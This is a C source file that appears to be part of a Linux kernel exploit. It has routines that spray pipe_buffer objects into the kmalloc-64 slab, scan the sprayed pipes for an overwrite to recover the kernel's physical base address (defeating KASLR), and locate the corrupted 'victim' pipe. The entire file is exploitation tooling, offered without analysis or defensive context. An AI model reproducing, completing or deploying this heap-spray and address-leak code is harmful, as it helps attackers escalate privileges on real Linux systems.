#include <asm-generic/ioctls.h>
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "log.h"
#include "pipe_buffer.h"


static void create_anon_pipe(struct pipe *p) {
    /* Create pipe */
    if (pipe((int *)p) == -1)
        do_error_exit("pipe");

    /* Set size of pipe_buffer array so pipe_buffer ends up kmalloc-64 */
    if ((fcntl(p->write, F_SETPIPE_SZ, PIPE_SZ)) == -1)
        do_error_exit("fcntl(F_SETPIPE_SZ)");

    /* Write to the pipe to initialize the struct pipe_buffer */
    if ((write(p->write, INIT_STRING, INIT_STRING_SZ)) == -1)
        do_error_exit("write(pipe)");
}

/**
 * spray_pipe_buffer(): Spray pipes
 * @spray_size: Number of objects to put into `kmalloc-64`
 * @fd_buffer: Buffer to be filled with pipe file descriptors
 */
void spray_pipe_buffer(uint32_t spray_size, struct pipe *fd_buffer) {
    uint32_t i; /* iterator */

    for (i = 0; i < spray_size; i++) {
        create_anon_pipe(&fd_buffer[i]);
    }
}

static void release_anon_pipe(struct pipe *p) {
    if ((close(p->write)) == -1)
        do_error_exit("close(pipe.write)");
    if ((close(p->read)) == -1)
        do_error_exit("close(pipe.read)");
}

/**
 * release_pipe_buffer(): Free pipe buffer and close file descriptors
 * @spray_size: Number of object to free from `kmalloc-64`
 * @fd_buffer: Buffer of pipe file descriptors to free
 */
void release_pipe_buffer(uint32_t spray_size, struct pipe *fd_buffer) {
    uint32_t i; /* iterator */

    for (i = 0; i < spray_size; i++) {
        release_anon_pipe(&fd_buffer[i]);
    }

    free(fd_buffer);
}

static long _get_phys_base(struct pipe *pipe, long paddr) {
    long data;
    long ret = 0;

    if ((read(pipe->read, &data, sizeof(long))) == -1)
        do_error_exit("read");

    switch (data) {
        case QWORD0:
            ret = paddr;
            break;
        case QWORD1:
            ret = paddr - PHYSICAL_ALIGN;
            break;
        case QWORD2:
            ret = paddr - (PHYSICAL_ALIGN * 2);
            break;
        case QWORD3:
            ret = paddr - (PHYSICAL_ALIGN * 3);
            break;
        case QWORD4:
            ret = paddr - (PHYSICAL_ALIGN * 4);
            break;
        case QWORD5:
            ret = paddr - (PHYSICAL_ALIGN * 5);
            break;
        case QWORD6:
            ret = paddr - (PHYSICAL_ALIGN * 6);
            break;
        case QWORD7:
            ret = paddr - (PHYSICAL_ALIGN * 7);
            break;
    }

    return ret;
}

/**
 * get_phys_base(): Search for the physical base address of the kernel
 * @spray_size: Number of pipes to check for overwrite
 * @fd_buffer: Buffer of pipe file descriptors to check 
 * @paddr: Current physical address we are probing
 */
long get_phys_base(uint32_t spray_size, struct pipe *fd_buffer, long paddr) {
    uint32_t i;
    long ret = 0;

    for (i = 0; i < spray_size; i++) {
        if ((ret = _get_phys_base(&fd_buffer[i], paddr)) != 0)
            break;
    }

    return ret;
}

/**
 * TODO!
 */
struct pipe *get_victim_pipe(uint32_t spray_size, struct pipe *fd_buffer) {
    uint32_t i;
    struct pipe *pipe;
    int nbytes;

    for (i = 0; i < spray_size; i++) {
        pipe = &fd_buffer[i];

        if ((ioctl(pipe->read, FIONREAD, &nbytes)) == -1)
            do_error_exit("ioctl(FIONREAD)");

        if (nbytes > INIT_STRING_SZ)
            return pipe;
    }

    return NULL;
}
